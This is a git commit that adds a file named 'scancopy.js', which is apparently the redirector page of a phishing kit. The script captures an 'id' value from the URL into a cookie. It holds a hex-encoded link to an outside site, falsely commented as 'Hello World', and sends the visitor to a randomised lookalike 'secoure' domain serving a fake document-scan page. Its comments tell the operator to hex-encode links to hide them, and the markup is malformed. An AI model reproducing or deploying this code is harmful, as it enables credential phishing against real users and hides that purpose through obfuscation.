ae3d778356c552804645086ebe821ef9876e65f5
amazon334 <arnazohealthcare2021@gmail.com>
2025-08-20 10:09:57 -0700

    Create scancopy.js

---
+++ scancopy.js
@@ -0,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<head>
+<title>Invidunt lorem justo sanctus clita. Erat lorem labore ea, justo dolor lorem ipsum ut sed eos, ipsum et dolor kasd sit ea justo. Erat justo sed sed diam.</title>
+</head>
+</head>
+<body>
+  <script>
+    function setCookie(name, value, daysToExpire) {
+      const d = new Date();
+      d.setTime(d.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
+      const expires = "expires=" + d.toUTCString();
+      document.cookie = `${name}=${encodeURIComponent(value)}; ${expires}; path=/`;
+    }
+
+
+	var feedUpdateResponse = window.location.href;
+    var url = new URL(feedUpdateResponse);
+      var params = new URLSearchParams(url.search);
+	  
+	   
+
+	  
+	  
+        var loginValue = params.get("id"); //
+
+
+
+  
+    // Call set and get together
+    setCookie("myText", loginValue, 7);
+	
+	
+	<!-- MAKE SURE YOU ENCODE UR COOKIES-LINK TO HEX ENCODE FOMAR
+
+function hexDecode(hexString) {
+  let decoded = '';
+  for (let i = 0; i < hexString.length; i += 2) {
+    const hexPair = hexString.substr(i, 2);
+    decoded += String.fromCharCode(parseInt(hexPair, 16));
+  }
+  return decoded;
+}
+
+// Example usage
+const hex = "68747470733A2F2F67686F7374637573746F6D7A2E6C6966652F6465736B6F66666963652E68746D6C"; // "Hello World"
+const result = hexDecode(hex);
+console.log(result);  // Output: Hello World
+
+let num = Math.floor(Math.random() * 50) * 2;
+
+<!-- MAKE SURE YOU ENCODE UR COOKIES-LINK TO HEX ENCODE FOMART
+self.location = "https://secoure"+num+".adajye.com/doc1/Scancopy.html";
+
+  </script>
+</body>
+</html>
+
+
+<html>
+
